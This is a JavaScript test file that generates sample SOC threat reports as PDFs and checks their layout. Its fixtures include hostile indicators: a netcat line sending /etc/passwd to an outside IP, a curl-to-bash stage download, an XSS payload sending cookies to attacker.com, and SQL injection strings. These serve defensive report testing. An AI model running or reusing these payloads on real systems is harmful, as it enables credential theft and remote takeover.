/**
 * pdf_layout_verification_test.js
 * Comprehensive PDF Layout & Presentation Verification Test Suite.
 * Generates and verifies PDFs for:
 * 1. SQL Injection (sqli.log) with long text fields
 * 2. SSH Brute Force
 * 3. Command Injection / RCE with Gemini AI analysis
 * 4. Cross-Site Scripting (XSS)
 * 5. Port Sweep / Reconnaissance
 * 6. Incident with Long Action Audit Trail (8+ actions)
 */

process.env.NODE_ENV = "test";

const mongoose = require("mongoose");
const fs = require("fs");
const path = require("path");
const PdfReportService = require("../services/PdfReportService");

const MONGO_URI = "mongodb://127.0.0.1:27017/aegissphere";
const OUTPUT_DIR = path.resolve(__dirname, "../../test_output/pdf_layout_audits");

const extractAllPdfText = (buffer) => {
  const raw = buffer.toString("latin1");
  const textParts = [];

  const hexMatches = raw.match(/<([0-9a-fA-F]+)>/g) || [];
  for (const m of hexMatches) {
    const hex = m.slice(1, -1);
    textParts.push(Buffer.from(hex, "hex").toString("latin1"));
  }

  const literalMatches = raw.match(/\(([^()]*)\)/g) || [];
  for (const m of literalMatches) {
    textParts.push(m.slice(1, -1));
  }

  return textParts.join("");
};

const generatePdfBuffer = (reportData) => {
  return new Promise((resolve, reject) => {
    const chunks = [];
    const mockRes = {
      write: (chunk) => chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk)),
      end: (chunk) => {
        if (chunk) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
        resolve(Buffer.concat(chunks));
      },
      on: () => {},
      once: () => {},
      emit: () => {},
    };

    try {
      PdfReportService.generateReportPdf(reportData, mockRes);
    } catch (err) {
      reject(err);
    }
  });
};

const runPdfLayoutVerification = async () => {
  console.log("================================================================================");
  console.log("AEGISSPHERE: COMPREHENSIVE SOC PDF REPORT LAYOUT & PRESENTATION AUDIT");
  console.log("================================================================================\n");

  if (!fs.existsSync(OUTPUT_DIR)) {
    fs.mkdirSync(OUTPUT_DIR, { recursive: true });
  }

  await mongoose.connect(MONGO_URI);
  console.log("✓ Connected to MongoDB.\n");

  const results = [];
  const recordResult = (name, passed, details = {}) => {
    results.push({ name, passed, details });
    if (passed) {
      console.log(`   [PASS] ${name}`);
    } else {
      console.log(`   [FAIL] ${name} -> ${JSON.stringify(details)}`);
    }
  };

  const dummyUser = {
    name: "Senior SOC Analyst",
    email: "lead_analyst@aegissphere.io",
    role: "Analyst",
  };

  // ---------------------------------------------------------------------------
  // TEST 1: SQL Injection (sqli.log) with Very Long Text & URI parameters
  // ---------------------------------------------------------------------------
  console.log("--- 1. AUDITING SQL INJECTION (sqli.log) WITH EXTENSIVE TEXT ---");
  const sqliReportData = {
    report: {
      _id: new mongoose.Types.ObjectId(),
      title: "SOC Forensic Audit — SQL Injection Attack Analysis (sqli.log)",
      summary:
        "Comprehensive forensic investigation of persistent SQL injection exploit vectors targeted at production relational database layer. Deterministic signature analysis identified malicious UNION SELECT operations, database schema extraction payloads, and authentication bypass routines injected into HTTP GET/POST endpoints. Immediate database privilege restriction and web application firewall rule deployment executed.",
      status: "Generated",
      generatedBy: dummyUser,
      createdAt: new Date(),
    },
    log: {
      originalName: "sqli.log",
      filename: "sqli_audit_sample.log",
      fileSize: 18432,
      fileFormat: ".log",
    },
    threats: [
      {
        threatType: "SQL Injection Attack (UNION SELECT Extraction)",
        severity: "High",
        confidence: 96,
        confidenceReason:
          "Deterministic regex pattern matched UNION SELECT statements coupled with information_schema database table queries in the parameter 'id' of the web access request. Multi-statement injection observed.",
        sourceIp: "198.51.100.77",
        destinationIp: "10.0.4.15",
        mitreTechnique: "T1190 - Exploit Public-Facing Application",
        matchedIndicators: [
          "UNION SELECT null, username, password_hash, email FROM app_users WHERE admin=1",
          "CONCAT(schema_name) FROM information_schema.schemata",
          "SLEEP(5) benchmark timing verification payload",
          "-- comment delimiter appended to truncate downstream SQL query parsing",
        ],
        description:
          "High-volume structured query language injection attempt designed to dump administrative credentials from database storage and bypass authentication mechanisms.",
        recommendation:
          "1. Immediately convert all raw dynamic database queries to parameterized prepared statements using object-relational mapping.\n2. Configure input validation filters to reject unexpected SQL meta-characters.\n3. Implement least-privilege database user role permissions preventing access to system metadata catalogs.",
        createdAt: new Date(),
        status: "Investigating",
      },
    ],
    incidents: [
      {
        incidentId: "INC-SQLI-2026-01",
        title: "Critical Database Infiltration Vector (SQLi)",
        severity: "High",
        status: "Investigating",
        assignedTo: dummyUser,
        createdAt: new Date(),
        updatedAt: new Date(),
        description: "Active SQL injection exploitation attempt detected against public web storefront API.",
        actionHistory: [
          {
            action: "Database Query Logging Enabled",
            status: "Recorded",
            performedByName: "Senior SOC Analyst",
            timestamp: new Date(),
            notes: "Configured full query audit log on DB replica 01.",
          },
          {
            action: "WAF Parameter Rule Deployed",
            status: "Recorded",
            performedByName: "Senior SOC Analyst",
            timestamp: new Date(),
            notes: "Added regex filter for UNION SELECT patterns.",
          },
        ],
      },
    ],
  };

  const sqliBuffer = await generatePdfBuffer(sqliReportData);
  const sqliPath = path.join(OUTPUT_DIR, "sqli_report_output.pdf");
  fs.writeFileSync(sqliPath, sqliBuffer);
  const sqliText = extractAllPdfText(sqliBuffer);

  const sqliPass =
    sqliBuffer.slice(0, 5).toString() === "%PDF-" &&
    sqliText.includes("SQL Injection Attack") &&
    sqliText.includes("198.51.100.77") &&
    sqliText.includes("T1190") &&
    sqliText.includes("UNION SELECT");

  recordResult("1. SQL Injection (sqli.log) generated with pristine layout and long field wrapping", sqliPass, {
    sizeBytes: sqliBuffer.length,
    outputFile: sqliPath,
  });

  // ---------------------------------------------------------------------------
  // TEST 2: SSH Brute Force
  // ---------------------------------------------------------------------------
  console.log("\n--- 2. AUDITING SSH BRUTE FORCE REPORT ---");
  const bruteReportData = {
    report: {
      _id: new mongoose.Types.ObjectId(),
      title: "SOC Audit — High-Frequency SSH Authentication Flooding",
      summary:
        "Deterministic detection of distributed SSH dictionary attack attempting brute-force password discovery against boundary gateway systems.",
      status: "Generated",
      generatedBy: dummyUser,
      createdAt: new Date(),
    },
    log: {
      originalName: "auth_sshd.log",
      filename: "auth_sshd.log",
      fileSize: 45000,
      fileFormat: ".log",
    },
    threats: [
      {
        threatType: "SSH Brute Force Attack",
        severity: "Critical",
        confidence: 98,
        confidenceReason: "24 failed authentication attempts within 8 seconds from a single external IP address.",
        sourceIp: "198.51.100.22",
        destinationIp: "10.0.0.1",
        mitreTechnique: "T1110 - Brute Force",
        matchedIndicators: [
          "Failed password for invalid user admin from 198.51.100.22 port 50201 ssh2",
          "Failed password for root from 198.51.100.22 port 50202 ssh2",
          "Repeated authentication failures exceed threshold (>5 attempts/min)",
        ],
        description: "Automated credential stuffing targeting port 22.",
        recommendation: "Ban source IP at perimeter firewall, enforce public key authentication only.",
        createdAt: new Date(),
        status: "Mitigated",
      },
    ],
    incidents: [],
  };

  const bruteBuffer = await generatePdfBuffer(bruteReportData);
  const brutePath = path.join(OUTPUT_DIR, "brute_force_report_output.pdf");
  fs.writeFileSync(brutePath, bruteBuffer);
  const bruteText = extractAllPdfText(bruteBuffer);

  const brutePass =
    bruteBuffer.slice(0, 5).toString() === "%PDF-" &&
    bruteText.includes("SSH Brute Force") &&
    bruteText.includes("198.51.100.22") &&
    bruteText.includes("T1110");
  recordResult("2. SSH Brute Force report generated cleanly without incidents", brutePass, {
    sizeBytes: bruteBuffer.length,
    outputFile: brutePath,
  });

  // ---------------------------------------------------------------------------
  // TEST 3: Command Injection / RCE with Gemini AI Contextual Reasoning Block
  // ---------------------------------------------------------------------------
  console.log("\n--- 3. AUDITING COMMAND INJECTION (RCE) + GEMINI AI BLOCK ---");
  const rceReportData = {
    report: {
      _id: new mongoose.Types.ObjectId(),
      title: "SOC Forensic Audit — Remote Code Execution Exploit Attempt",
      summary:
        "Critical RCE exploit attempt containing shell execution commands and outbound reverse shell staging. Enriched with Google Gemini contextual security analysis.",
      status: "Generated",
      generatedBy: dummyUser,
      createdAt: new Date(),
    },
    log: {
      originalName: "web_rce_payload.json",
      filename: "web_rce_payload.json",
      fileSize: 8192,
      fileFormat: ".json",
    },
    threats: [
      {
        threatType: "Command Injection Attempt (RCE)",
        severity: "Critical",
        confidence: 95,
        confidenceReason: "Shell metacharacters (; | ` $) combined with OS utility invocations (/bin/sh, nc, curl).",
        sourceIp: "198.51.100.99",
        destinationIp: "10.0.1.200",
        mitreTechnique: "T1059 - Command and Scripting Interpreter",
        matchedIndicators: [
          "; cat /etc/passwd | nc 198.51.100.99 4444",
          "curl -s http://198.51.100.99/stage2.sh | bash",
        ],
        description: "Arbitrary command execution attempt against backend web API processing worker.",
        recommendation: "Isolate affected container, revoke temporary credentials, patch input sanitization.",
        createdAt: new Date(),
        status: "Active",
        aiAnalysis: {
          model: "gemini-2.5-flash",
          confidenceInAnalysis: "high",
          generatedAt: new Date(),
          summary:
            "Attacker is attempting to establish an interactive reverse shell via netcat and exfiltrate system password hashes.",
          whySuspicious: [
            "Direct invocation of command interpreter binary (/bin/sh)",
            "Outbound network socket creation to untrusted public IP",
            "Attempts to access sensitive operating system identity database",
          ],
          observedEvidence: [
            "Payload contains explicit netcat reverse shell syntax",
            "Query parameter pipes file contents into network socket",
          ],
          investigationSteps: [
            "Check active network sockets on host 10.0.1.200 (ss -tulpn)",
            "Inspect cron jobs and systemd unit files for persistence implants",
            "Analyze web application user process privileges",
          ],
          remediation: [
            "Sever network connectivity for web node 10.0.1.200 immediately",
            "Apply zero-trust network ingress rule blocking 198.51.100.99",
            "Deploy Web Application Firewall rule inspecting body payloads for shell metacharacters",
          ],
          riskContext: "Total takeover of application tier and lateral movement into internal VPC.",
          uncertainty: "Payload may fail if host filesystem is mounted read-only and nc is not installed.",
        },
      },
    ],
    incidents: [],
  };

  const rceBuffer = await generatePdfBuffer(rceReportData);
  const rcePath = path.join(OUTPUT_DIR, "rce_ai_report_output.pdf");
  fs.writeFileSync(rcePath, rceBuffer);
  const rceText = extractAllPdfText(rceBuffer);

  const rcePass =
    rceBuffer.slice(0, 5).toString() === "%PDF-" &&
    rceText.includes("Command Injection Attempt") &&
    rceText.includes("AI-ASSISTED CONTEXTUAL ANALYSIS") &&
    rceText.includes("gemini-2.5-flash") &&
    rceText.includes("interactive reverse shell");
  recordResult("3. Command Injection (RCE) with Gemini AI reasoning block formatted cleanly", rcePass, {
    sizeBytes: rceBuffer.length,
    outputFile: rcePath,
  });

  // ---------------------------------------------------------------------------
  // TEST 4: Cross-Site Scripting (XSS)
  // ---------------------------------------------------------------------------
  console.log("\n--- 4. AUDITING CROSS-SITE SCRIPTING (XSS) REPORT ---");
  const xssReportData = {
    report: {
      _id: new mongoose.Types.ObjectId(),
      title: "SOC Audit — Stored & Reflected Cross-Site Scripting Probes",
      summary: "Client-side exploit payloads identified attempting document.cookie exfiltration.",
      status: "Generated",
      generatedBy: dummyUser,
      createdAt: new Date(),
    },
    log: {
      originalName: "xss_vectors.log",
      filename: "xss_vectors.log",
      fileSize: 12000,
      fileFormat: ".log",
    },
    threats: [
      {
        threatType: "Cross-Site Scripting (XSS)",
        severity: "Medium",
        confidence: 88,
        confidenceReason: "HTML tag injection (<script>, onerror=, javascript:) in URI parameter.",
        sourceIp: "198.51.100.115",
        mitreTechnique: "T1059.007 - JavaScript",
        matchedIndicators: [
          "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
          "<img src=x onerror=alert(1)>",
        ],
        description: "Malicious JavaScript injection in HTTP user-agent and search input fields.",
        recommendation: "Apply context-aware output encoding and configure Content-Security-Policy header.",
        createdAt: new Date(),
        status: "Active",
      },
    ],
    incidents: [],
  };

  const xssBuffer = await generatePdfBuffer(xssReportData);
  const xssPath = path.join(OUTPUT_DIR, "xss_report_output.pdf");
  fs.writeFileSync(xssPath, xssBuffer);
  const xssText = extractAllPdfText(xssBuffer);

  const xssPass =
    xssBuffer.slice(0, 5).toString() === "%PDF-" &&
    xssText.includes("Cross-Site Scripting") &&
    xssText.includes("198.51.100.115") &&
    xssText.includes("T1059.007");
  recordResult("4. Cross-Site Scripting (XSS) report rendered without text collision", xssPass, {
    sizeBytes: xssBuffer.length,
    outputFile: xssPath,
  });

  // ---------------------------------------------------------------------------
  // TEST 5: Port Sweep / Reconnaissance
  // ---------------------------------------------------------------------------
  console.log("\n--- 5. AUDITING PORT SWEEP / RECONNAISSANCE REPORT ---");
  const portReportData = {
    report: {
      _id: new mongoose.Types.ObjectId(),
      title: "SOC Audit — Perimeter Port Sweep & Reconnaissance Telemetry",
      summary: "Broad-spectrum TCP/UDP port reconnaissance detected across DMZ perimeter hosts.",
      status: "Generated",
      generatedBy: dummyUser,
      createdAt: new Date(),
    },
    log: {
      originalName: "firewall_flow.csv",
      filename: "firewall_flow.csv",
      fileSize: 32000,
      fileFormat: ".csv",
    },
    threats: [
      {
        threatType: "Port Sweep / Network Reconnaissance",
        severity: "Low",
        confidence: 80,
        confidenceReason: "Connection attempts across 50+ unique ports within a 10-second sliding window.",
        sourceIp: "198.51.100.4",
        mitreTechnique: "T1595 - Active Scanning",
        matchedIndicators: ["Sequential SYN scan across ports 21, 22, 23, 80, 443, 8080, 8443"],
        description: "Probing for open services and software versions.",
        recommendation: "Ensure closed ports silently drop SYN packets and rate-limit TCP SYN flags.",
        createdAt: new Date(),
        status: "Resolved",
      },
    ],
    incidents: [],
  };

  const portBuffer = await generatePdfBuffer(portReportData);
  const portPath = path.join(OUTPUT_DIR, "port_sweep_report_output.pdf");
  fs.writeFileSync(portPath, portBuffer);
  const portText = extractAllPdfText(portBuffer);

  const portPass =
    portBuffer.slice(0, 5).toString() === "%PDF-" &&
    portText.includes("Port Sweep") &&
    portText.includes("198.51.100.4") &&
    portText.includes("T1595");
  recordResult("5. Port Sweep report generated with proper LOW / RESOLVED badge metrics", portPass, {
    sizeBytes: portBuffer.length,
    outputFile: portPath,
  });

  // ---------------------------------------------------------------------------
  // TEST 6: Incident with Long Action Audit Trail (8+ Actions Spanning Flow)
  // ---------------------------------------------------------------------------
  console.log("\n--- 6. AUDITING INCIDENT WITH EXTENSIVE AUDIT TRAIL (MULTI-ACTION) ---");
  const longAuditReportData = {
    report: {
      _id: new mongoose.Types.ObjectId(),
      title: "SOC Comprehensive Incident Audit — Multi-Stage Breach Containment",
      summary:
        "Full lifecycle incident response audit report detailing eight containment, eradication, and forensic recovery milestones executed by SOC response teams.",
      status: "Closed",
      generatedBy: dummyUser,
      createdAt: new Date(),
    },
    log: {
      originalName: "incident_full_lifecycle.log",
      filename: "incident_full_lifecycle.log",
      fileSize: 56000,
      fileFormat: ".log",
    },
    threats: [
      {
        threatType: "Multi-Vector Breach Attempt",
        severity: "Critical",
        confidence: 99,
        confidenceReason: "Correlated credential theft followed by lateral movement and privileged API invocation.",
        sourceIp: "198.51.100.200",
        destinationIp: "10.0.0.50",
        mitreTechnique: "T1078 - Valid Accounts",
        matchedIndicators: ["Multiple privileged API token usage from foreign ASN", "Abnormal data egress volume"],
        description: "Compromised administrative session utilized to query confidential datasets.",
        recommendation: "Revoke all user session tokens, force password reset with MFA challenge.",
        createdAt: new Date(),
        status: "Resolved",
      },
    ],
    incidents: [
      {
        incidentId: "INC-2026-MAJOR-BREACH",
        title: "Major Account Takeover & Data Exfiltration Containment",
        severity: "Critical",
        status: "Resolved",
        assignedTo: dummyUser,
        createdAt: new Date(Date.now() - 3600000 * 5),
        updatedAt: new Date(),
        description:
          "Comprehensive incident response ticket tracking coordinated actions taken by Tier-1 through Tier-3 SOC analysts to isolate compromised accounts and purge unauthorized access tokens.",
        actionHistory: [
          {
            action: "Initial Alarm Triaged & Escalated to Level 2",
            status: "Executed",
            performedByName: "Analyst Alice",
            timestamp: new Date(Date.now() - 3600000 * 4.5),
            notes: "Confirmed anomalous API traffic pattern originating from 198.51.100.200.",
          },
          {
            action: "Ingress Traffic Quarantined at Border Gateway",
            status: "Executed",
            performedByName: "Network Admin Bob",
            timestamp: new Date(Date.now() - 3600000 * 4),
            notes: "Applied temporary BGP blackhole filter for attacker subnet.",
          },
          {
            action: "Active User Session Revoked & Tokens Invalidated",
            status: "Executed",
            performedByName: "SOC Lead Carol",
            timestamp: new Date(Date.now() - 3600000 * 3.5),
            notes: "Purged Redis session cache and forced OAuth token revocation across all microservices.",
          },
          {
            action: "Memory Dump & Volatile Artifact Capture",
            status: "Executed",
            performedByName: "Forensic Analyst Dave",
            timestamp: new Date(Date.now() - 3600000 * 3),
            notes: "Acquired memory image of worker pod app-worker-7f49c for offline volatile analysis.",
          },
          {
            action: "Host Isolated from Internal Microsegment Network",
            status: "Executed",
            performedByName: "Infrastructure Team",
            timestamp: new Date(Date.now() - 3600000 * 2.5),
            notes: "Assigned quarantine security group preventing east-west lateral communication.",
          },
          {
            action: "Database Query Audit & Egress Assessment Completed",
            status: "Executed",
            performedByName: "DBA Specialist Frank",
            timestamp: new Date(Date.now() - 3600000 * 2),
            notes: "Verified that zero customer PII was exfiltrated during the 4-minute exposure window.",
          },
          {
            action: "Root Cause Remediation & Code Patch Verification",
            status: "Executed",
            performedByName: "AppSec Team Lead",
            timestamp: new Date(Date.now() - 3600000 * 1),
            notes: "Deployed hotfix preventing token reuse across different client user-agents.",
          },
          {
            action: "Final Incident Closure & Executive Sign-off",
            status: "Executed",
            performedByName: "CISO / SOC Director",
            timestamp: new Date(),
            notes: "Incident officially mitigated and closed with zero data loss confirmed.",
          },
        ],
      },
    ],
  };

  const longAuditBuffer = await generatePdfBuffer(longAuditReportData);
  const longAuditPath = path.join(OUTPUT_DIR, "long_audit_trail_report_output.pdf");
  fs.writeFileSync(longAuditPath, longAuditBuffer);
  const longAuditText = extractAllPdfText(longAuditBuffer);

  const longAuditPass =
    longAuditBuffer.slice(0, 5).toString() === "%PDF-" &&
    longAuditText.includes("INC-2026-MAJOR-BREACH") &&
    longAuditText.includes("Containment Action Audit Trail") &&
    longAuditText.includes("Initial Alarm Triaged") &&
    longAuditText.includes("Final Incident Closure");
  recordResult("6. Incident with long multi-step audit trail wraps across pages cleanly", longAuditPass, {
    sizeBytes: longAuditBuffer.length,
    outputFile: longAuditPath,
  });

  // ---------------------------------------------------------------------------
  // SUMMARY
  // ---------------------------------------------------------------------------
  console.log("\n================================================================================");
  const total = results.length;
  const passed = results.filter((r) => r.passed).length;
  const failed = results.filter((r) => !r.passed).length;
  console.log(`PDF LAYOUT AUDIT SUITE COMPLETE: ${passed}/${total} TESTS PASSED (${failed} FAILED)`);
  console.log("================================================================================\n");

  await mongoose.disconnect();
  return failed === 0;
};

runPdfLayoutVerification().catch((err) => {
  console.error("FATAL PDF LAYOUT AUDIT ERROR:", err);
  process.exit(1);
});
